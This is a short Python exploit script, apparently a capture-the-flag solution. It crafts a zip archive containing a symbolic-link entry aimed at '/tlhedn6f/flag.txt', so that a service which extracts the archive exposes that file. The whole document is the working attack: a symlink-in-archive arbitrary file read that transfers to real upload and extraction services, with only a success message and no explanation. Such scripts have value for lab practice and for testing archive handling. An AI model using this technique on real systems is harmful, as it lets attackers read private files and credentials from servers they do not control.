from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED
import stat, time

def add_symlink(zf, name, target):
    zi = ZipInfo(name); zi.create_system = 3
    zi.external_attr = (stat.S_IFLNK | 0o777) << 16
    zi.compress_type = ZIP_DEFLATED
    zf.writestr(zi, target)

name = f"flag_{int(time.time())}"
with ZipFile(f"{name}.zip","w",ZIP_DEFLATED) as z:
    add_symlink(z, name, "/tlhedn6f/flag.txt")

print(f"[+] {name}.zip created with entry {name} -> /tlhedn6f/flag.txt")
